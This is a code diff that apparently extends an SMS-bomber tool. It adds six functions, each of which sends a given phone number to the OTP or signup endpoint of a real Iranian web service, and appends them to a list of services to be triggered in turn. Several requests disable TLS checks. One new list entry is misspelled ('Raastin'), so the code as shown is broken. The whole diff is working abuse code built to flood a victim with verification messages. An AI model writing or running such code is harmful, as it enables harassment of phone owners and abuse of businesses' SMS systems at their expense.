@@ -505,6 +505,99 @@ def raheeno(phone):
         return r.status_code == 200
     except: return False
 
+
+
+def raastin(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://api.raastin.com/api/v1/accounts/signup/init/", 
+                          json={"phone": phone}, 
+                          headers={"Origin": "https://raastin.com", "Referer": "https://raastin.com/"}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+def pinket(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://pinket.com/api/cu/v2/phone-verification", 
+                          json={"phoneNumber": phone}, 
+                          headers={"Origin": "https://pinket.com", "Referer": "https://pinket.com/"}, 
+                          timeout=10, verify=False)
+        return r.status_code in [200, 201]
+    except: return False
+
+
+
+
+def pindo(phone):
+    pindo_url = "https://api.pindo.ir/v1/user/login-register/"
+    pindo_payload = {"phone": "0"+phone.split("+98")[1]}
+    try:
+        pindo_response = post(timeout=5, url=pindo_url, json=pindo_payload).text
+        if "success" in pindo_response.lower():  # یا شرط مناسب با پاسخ API
+            print(f'{g}(Pindo) {a}Code Sent')
+            return True
+    except Exception as e:
+        print(f'[!] Pindo Exception: {e}')
+        return False
+
+
+
+def otaghak(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", 
+                          json={"userName": phone}, 
+                          headers={"Content-Type": "application/json"}, 
+                          timeout=10, verify=False)
+        return r.status_code in [200, 201]
+    except: return False
+
+
+
+def ompfinex(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://api.ompfinex.com/v2/user/sign-up", 
+                          json={"username": phone}, 
+                          headers={"Origin": "https://ompfinex.com", "Referer": "https://ompfinex.com/"}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+
+
+
+def okala(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        headers = {
+            "Content-Type": "application/json",
+            "X-Correlation-Id": str(uuid.uuid4()),
+            "Origin": "https://okala.com",
+            "Referer": "https://okala.com/"
+        }
+        payload = {
+            "mobile": phone,
+            "confirmTerms": True,
+            "notRobot": False,
+            "ValidationCodeCreateReason": 5,
+            "OtpApp": 0,
+            "deviceTypeCode": 7,
+            "IsAppOnly": False
+        }
+        r = requests.post("https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", 
+                          json=payload, headers=headers, timeout=10)
+        return r.status_code in [200, 201, 202]
+    except: return False
+
+
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
@@ -513,7 +606,7 @@ services = [
     arzplus, arzunex, azkivam, azno, basalam,
     bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
     darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp, sheypoor, shahrfarsh, sarmayex, riiha, raheeno, tetherland
+    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp, sheypoor, shahrfarsh, sarmayex, riiha, raheeno, tetherland, Raastin, pinket, pindo, otaghak, ompfinex, okala
 ]
 
 
